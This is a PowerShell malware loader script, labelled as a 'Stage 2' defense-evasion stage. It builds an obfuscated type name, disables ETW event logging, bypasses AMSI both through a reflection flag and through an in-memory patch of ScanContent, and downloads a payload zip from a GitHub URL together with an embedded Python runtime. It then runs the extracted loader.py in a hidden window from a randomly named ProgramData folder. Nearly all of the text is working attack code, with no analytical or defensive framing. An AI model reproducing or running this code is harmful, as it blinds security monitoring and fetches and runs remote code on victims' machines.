# ============================================================
#  Stage 2 — Defense evasion (MIMICRAT-style, $smaau wired in)
# ============================================================

# ---------- 1. Arithmetic-obfuscated type name ----------
# Resolves to: "System.Diagnostics.Eventing.EventProvider"
$smaau = -join [char[]] @(
    ((669622-12345)/7919),((970544-12345)/7919),((923030-12345)/7919),
    ((930949-12345)/7919),((812164-12345)/7919),((875516-12345)/7919),
    ((376619-12345)/7919),((622108-12345)/7919),((780488-12345)/7919),
    ((883435-12345)/7919),((780488-12345)/7919),((828002-12345)/7919),
    ((812164-12345)/7919),((875516-12345)/7919),((812164-12345)/7919),
    ((883435-12345)/7919),((930949-12345)/7919),((376619-12345)/7919),
    ((527080-12345)/7919),((938868-12345)/7919),((930949-12345)/7919),
    ((891354-12345)/7919),((875516-12345)/7919),((780488-12345)/7919),
    ((930949-12345)/7919),((843840-12345)/7919),((891354-12345)/7919),
    ((883435-12345)/7919),((376619-12345)/7919),((527080-12345)/7919),
    ((875516-12345)/7919),((923030-12345)/7919),((843840-12345)/7919),
    ((685460-12345)/7919),((930949-12345)/7919),((843840-12345)/7919),
    ((867597-12345)/7919),((923030-12345)/7919)
)

# ---------- 2. ETW bypass using $smaau ----------
try {
    $epType = [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType($smaau)

    $etwProvider = [Ref].Assembly.GetType(
        'System.Management.Automation.Tracing.PSEtwLogProvider'
    ).GetField('etwProvider','NonPublic,Static').GetValue($null)

    if ($epType -and $etwProvider) {
        $epType.GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider, 0)
    }
} catch {}

# ---------- 3. AMSI bypass (amsiInitFailed) ----------
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
        GetField('amsiInitFailed','NonPublic,Static').
        SetValue($null, $true)
} catch {}

# ---------- 4. AMSI memory patch (ScanContent → stub) ----------
try {
    $scanFunc = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
                GetMethods('NonPublic,Static') |
                Where-Object { $_.Name -eq 'ScanContent' }
    $patch = [byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)   # mov eax,0x80070057; ret
    $addr  = $scanFunc.MethodHandle.GetFunctionPointer()
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
} catch {}

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# ---------- Config ----------
$url       = 'https://github.com/putin22222/test/raw/refs/heads/main/lo.zip'
$pythonZip = 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip'

# ---------- Random folder under ProgramData ----------
$randName  = -join ((48..57) + (97..122) | Get-Random -Count 12 | ForEach-Object { [char]$_ })
$extractTo = Join-Path $env:ProgramData $randName
$zipPath   = Join-Path $extractTo 'lo.zip'
$pyZipPath = Join-Path $extractTo 'pyrt.zip'

New-Item -ItemType Directory -Path $extractTo -Force | Out-Null

# ---------- Download ----------
Write-Host "[*] Fetching payload..."
(New-Object Net.WebClient).DownloadFile($url, $zipPath)

Write-Host "[*] Fetching Python runtime..."
(New-Object Net.WebClient).DownloadFile($pythonZip, $pyZipPath)

# ---------- Extract both ----------
Expand-Archive -Path $zipPath   -DestinationPath $extractTo -Force
Expand-Archive -Path $pyZipPath -DestinationPath $extractTo -Force

Write-Host "[*] Extract dir: $extractTo"

# ---------- Locate REAL Python runtime ----------
$pythonExe = [string](
    Get-ChildItem $extractTo -Recurse -Filter 'python.exe' -ErrorAction SilentlyContinue |
    Where-Object {
        $_.Length -lt 200KB -and
        (Get-ChildItem $_.Directory -Filter 'python3*.dll' -ErrorAction SilentlyContinue)
    } |
    Select-Object -First 1 -ExpandProperty FullName
)

# ---------- Locate payload ----------
$pyScript = [string](
    Get-ChildItem $extractTo -Recurse -Filter 'loader.py' -ErrorAction SilentlyContinue |
    Select-Object -First 1 -ExpandProperty FullName
)

if (-not $pythonExe) { Write-Error "No real Python runtime found"; return }
if (-not $pyScript)  { Write-Error "No loader.py found"; return }

# ---------- Patch ._pth next to REAL runtime ----------
$realPyDir = [string](Split-Path -Parent $pythonExe)
$pthFile   = Get-ChildItem $realPyDir -Filter 'python*._pth' | Select-Object -First 1

if ($pthFile) {
    $stdlibZip = Get-ChildItem $realPyDir -Filter 'python3*.zip' |
                 Select-Object -First 1 -ExpandProperty Name
    if (-not $stdlibZip) { $stdlibZip = 'python311.zip' }

@"
$stdlibZip
.
Lib\site-packages
import site
"@ | Out-File -FilePath $pthFile.FullName -Encoding ASCII
    Write-Host "[*] Patched: $($pthFile.FullName)"
}

$scriptDir = [string](Split-Path -Parent $pyScript)
Write-Host "[*] Python : $pythonExe"
Write-Host "[*] Script : $pyScript"

# ---------- Sanity check ----------
$ver = & $pythonExe --version 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Error "Python failed to launch: $ver (exit $LASTEXITCODE)"
    return
}
Write-Host "[*] Version: $ver"

# ---------- Execute ----------
$p = Start-Process -FilePath $pythonExe `
                   -ArgumentList @($pyScript) `
                   -WorkingDirectory $scriptDir `
                   -WindowStyle Hidden `
                   -PassThru

Write-Host "[*] Started PID: $($p.Id)"
